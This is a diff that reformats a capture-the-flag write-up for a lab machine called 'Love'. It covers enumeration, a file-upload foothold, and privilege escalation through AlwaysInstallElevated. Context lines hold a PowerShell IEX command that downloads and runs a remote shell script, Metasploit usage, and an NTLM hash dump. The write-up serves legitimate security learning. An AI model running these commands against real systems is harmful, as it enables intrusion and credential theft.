@@ -5,9 +5,9 @@
 
 # Enumeration
 
-__IP-ADDR:__ 10.10.10.239 love.htb
+**IP-ADDR:** 10.10.10.239 love.htb
 
-__nmap scan:__
+**nmap scan:**
 ```bash
 PORT      STATE SERVICE      VERSION
 80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
@@ -64,17 +64,17 @@ PORT      STATE SERVICE      VERSION
 ```
 
 * Information leak from https ssl certificate. 
-  * __Subdomain:__ `staging.love.htb` 
-  * __Username:__ `roy@love.htb`
+  * **Subdomain:** `staging.love.htb` 
+  * **Username:** `roy@love.htb`
 * No other subdomain found: `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -H 'Host: FUZZ.love.htb' -u http://love.htb/ -ac -c -v`
 * port `5000` and `443` gives "403 Forbidden"
 * Can't connect to SMB without password.
 
-* __Host: `love.htb`__ asking for username:password
+* **Host: `love.htb`** asking for username:password
 
   ![](screenshots/love.png)
 
-* __Subdomain `staging.love.htb`__ have signup option which don't go anywhere,
+* **Subdomain `staging.love.htb`** have signup option which don't go anywhere,
 
   ![](screenshots/staging-love.png)
 
@@ -91,7 +91,9 @@ port `443` https don't response anything but port `5000` repsonse with admin cre
 
 * successful login to `http://love.htb/admin` with found creds. *It was just a guess. If I don't get admin login in `/admin`, than I'll run gobuster.*
 
-# Foothold:file_upload
+# Foothold
+
+## File upload to RCE
 
 Found file upload option in `/admin/voters.php` and `/admin/candidates.php`
 
@@ -129,13 +131,15 @@ Execute
 IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.71/msf_shell.ps1')
 ```
 
-# Privesc:AlwaysInstallElevated
+# Privesc
 
-Running winpeas found __AlwaysInstallElevated__ enable.
+## abusing `AlwaysInstallElevated` policy
+
+Running winpeas found **AlwaysInstallElevated** enable.
 
 ![](screenshots/winpeas.png)
 
-__AlwaysInstallElevated__ If these 2 registers are enabled (value is 0x1), then users of any privilege can install (execute) __`*.msi`__ files as __`NT AUTHORITY\SYSTEM`__.
+**AlwaysInstallElevated** If these 2 registers are enabled (value is 0x1), then users of any privilege can install (execute) **`*.msi`** files as **`NT AUTHORITY\SYSTEM`**.
 ```bash
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -147,14 +151,14 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 * Multiple ways to exploit from [hackingarticles.in](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/)
 
 
-__Exploit with metasploit__
+**Exploit with metasploit**
 ```bash
 exploit/windows/local/always_install_elevated
 ```
 
 ![](screenshots/love-rooted.png)
 
-__Dump NTLM hash__
+**Dump NTLM hash**
 ```bash
 meterpreter > load kiwi
 meterpreter > lsa_dump_sam
